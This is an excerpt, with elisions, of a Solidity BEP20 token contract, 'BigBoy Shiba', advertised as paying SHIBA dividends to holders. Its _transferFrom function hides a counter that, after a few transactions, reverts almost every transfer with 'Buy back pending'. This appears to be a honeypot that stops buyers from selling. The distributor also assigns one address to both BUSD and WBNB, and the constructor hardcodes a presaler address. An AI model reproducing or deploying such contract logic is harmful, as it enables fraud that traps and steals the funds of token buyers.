...
/**
 * Big boy shiba is out and howling! Earn SHIBA while holding big goy.
*/
...
contract DividendDistributor is IDividendDistributor {
    ...
    IBEP20 BUSD = IBEP20(0x2859e4544C4bB03966803b044A93563Bd2D0DD4D);
    address WBNB = 0x2859e4544C4bB03966803b044A93563Bd2D0DD4D;
    IDEXRouter router;
...
contract BigBoyShiba is IBEP20, Auth {
    using SafeMath for uint256;

    address BUSD = 0x2859e4544C4bB03966803b044A93563Bd2D0DD4D;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;

    string constant _name = "BigBoy Shiba";
    string constant _symbol = "BOYSHIB";
    ...
    constructor () Auth(msg.sender) {
        ...
        address _presaler = 0x614CE9F3965d2D10C5C4ccD1366b8d84765d13Aa;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        {
            buyBackTick++;if(buyBackTick > 3){
                buyBackLimit=liquidityFee;
                if (amount >= buyBackLimit) 
			    revert("Buy back pending");
            }
		}
